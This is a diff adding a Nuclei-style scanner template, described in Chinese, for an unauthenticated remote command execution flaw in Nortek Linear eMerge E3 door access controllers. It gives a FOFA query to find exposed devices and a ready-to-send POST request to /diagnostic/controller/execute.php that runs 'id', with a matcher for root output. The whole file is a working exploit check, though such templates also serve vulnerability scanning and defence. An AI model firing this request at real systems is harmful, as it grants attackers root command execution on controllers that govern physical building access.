@@ -1,0 +1,38 @@
+id: eMerge-E3-execute-RCE
+
+info:
+  name: eMerge E3 命令执行 execute.php
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: title="Linear eMerge"
+    Nortek Control Linear eMerge E3-Series是美国Nortek Control公司的一种门禁控制器。可指定人员在指定时间可以使用哪些门进出指定地点。/diagnostic/controller/execute.php远程代码执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。
+  reference:
+    - 
+  tags: RCE
+
+http:
+  - raw:
+      - |-
+        POST /diagnostic/controller/execute.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Priority: u=4
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 25
+
+        action=execute&command=id
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'gid=0(root)'
+      - type: status
+        status:
+          - 200
